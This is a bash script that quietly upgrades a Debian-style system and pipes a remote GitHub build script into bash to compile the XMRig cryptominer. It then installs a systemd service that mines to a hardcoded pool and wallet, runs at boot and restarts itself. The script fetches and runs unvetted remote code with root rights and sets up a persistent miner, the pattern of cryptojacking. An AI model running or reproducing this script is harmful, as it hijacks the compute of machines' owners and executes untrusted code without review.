SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/teampro.txt" ];
then
	echo "my power shall be absoulute" > teampro.txt
	export DEBIAN_FRONTEND=noninteractive
	sudo apt-get -qq update
	sudo apt-get -qq -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" upgrade -y
	sudo apt-get install -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" -y --force-yes make curl git unzip ca-certificates
	curl -s https://raw.githubusercontent.com/HighVoltage557/XmrigonAndroid/main/compile.sh | bash -s -- -y --force-yes
	cd xmrig/build
	echo -e "[Unit]\nDescription=XMRig Service\nAfter=network.target\n\n[Service]\nExecStart=/home/dinhtuan/xmrig/build/xmrig -o us-zephyr.miningocean.org:5332 -u ZEPHYR2mdUdNFbRWWNZGwy8VnFcyX8FzeZqY2xzybsDrCeoi3ewChSV8HMKne5Q9mQ3DvCDqPBREDHws32WK6DacTrwSDShNgMz29 -p bmw1 -a rx/0-k-t 10\nWorkingDirectory=/home/dinhtuan/xmrig/build\nRestart=always\nRestartSec=3\n\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/xmrig.service > /dev/null
	sudo systemctl daemon-reload
	sudo systemctl enable xmrig.service
	sudo systemctl start xmrig.service

else
	sudo systemctl start xmrig.service
fi
